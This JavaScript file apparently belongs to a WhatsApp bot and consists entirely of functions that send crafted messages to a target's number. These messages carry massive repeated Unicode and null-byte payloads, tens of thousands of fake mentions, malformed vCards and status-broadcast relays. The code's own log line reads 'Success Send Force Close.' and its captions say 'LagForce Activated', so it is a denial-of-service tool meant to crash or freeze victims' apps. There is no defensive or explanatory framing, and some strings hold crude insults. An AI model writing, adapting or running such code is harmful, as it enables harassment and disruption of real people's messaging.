async function lolipopku(target, mention) {
  const sock_ID = "5126860596";
  const sock_BELLA = "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh";
  const BUFFERLOLIPOP = "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  const MYMID = "5e03e0";
  const FileSha256 = "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=";
  const Sha25 = "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=";
  const mkey = "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=";

  const parse = false;
  const type = `image/webp`;

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${sock_BELLA}=${BUFFERLOLIPOP}=${sock_ID}&_nc_sid=${MYMID}&mms3=true`,
          fileSha256: FileSha256,
          fileEncSha256: Sha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${sock_BELLA}=${BUFFERLOLIPOP}=${sock_ID}&_nc_sid=${MYMID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function LOLIPOPXIOS(sock, target) {
await sock.relayMessage(target, {
  contactsArrayMessage: {
    displayName: "LOLIPOP PERMENKU" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "THIS IS sockA",
        vcard: `BEGIN:VCARD\nVERSION:15.0\nSerah Lu Dah\nFN:iPhone berapa bang\nitem1.TEL;waid=+628-888-999:+628-888-777\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "Peduli Apa gua 🗿",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nThis Id sock\nIphone Lu Berapa\nitem1.TEL;waid=+628-888-999:+628-888-777\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "Bacot kontol",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "Matalu"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}

async function VioletMention(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const noise = "\uFFF9\uFFFA\uFFFB".repeat(10000);
    const heavyTitle = "𓆩𓆪".repeat(2000) + "Finix";
    const heavyCaption = "🧬".repeat(10000) + noise + "LagForce Activated";

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Lu Jelek" + "ោ៝".repeat(10000),
        title: heavyTitle,
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/MiftahGoblok",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: heavyCaption,
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "Hello sock"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: { embeddedMusic },
                embeddedAction: true
            },
            {
                embeddedContent: {
                    title: heavyTitle,
                    description: noise
                }
            }
        ]
    };

    const audioMp3 = {
        url: "https://mmg.whatsapp.net/d/t62.7119-24/13156966_931344934952164_5193433792698949812_n.enc",
        mimetype: "audio/mpeg",
        fileSha256: "aX2HuG1xJzYnV1HkQxZsdP+uPfQ3+VRlq9Wpk6XU3E8=",
        mediaKey: "U2VjdXJlTWVkaWFLZXlGb3JNUDQ=",
        fileLength: "1024000",
        seconds: 120,
        contextInfo: {
            mentionedJid: mentionedList
        }
    };

    const voiceNote = {
        ...audioMp3,
        ptt: true
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage,
                audioMessage: audioMp3,
                voiceMessage: voiceNote
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { target },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function FcBeta(target, sockWeb) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Permen",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };
    await sock.relayMessage(sockWeb, message, {
      messageId: "",
      userJid: sockWeb
    });

    console.log(chalk.green("Success Send Force Close."));
  } catch (err) {
    console.error(chalk.red("Error: "), err.message);
  }
}  

async function betadelayNew(sock, target, mention) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Amelia Is Coming!!!",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message", //kalau bug nya ga ke kirim hapus aja ini, cuma tambahan doang.
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(2000);

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}

async function delayNew(sock, target, mention) {
  let sockMessage = {
  extendedTextMessage: {
    text: "ꦽ".repeat(300000),
    contextInfo: {
      participant: target,
      mentionedJid: [
        "0@s.whatsapp.net",
        ...Array.from(
          { length: 1900 },
          () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
        )
      ]
    }
  }
};
    let biji = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Amelia is cooming",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

const janda = generateWAMessageFromContent(target, sockMessage, {});
await sock.relayMessage("status@broadcast", janda.message, {
        messageId: janda.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    await sleep(500)
     if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: janda.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sock.relayMessage("status@broadcast", biji.message, {
        messageId: biji.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    await sleep(500);

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: biji.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}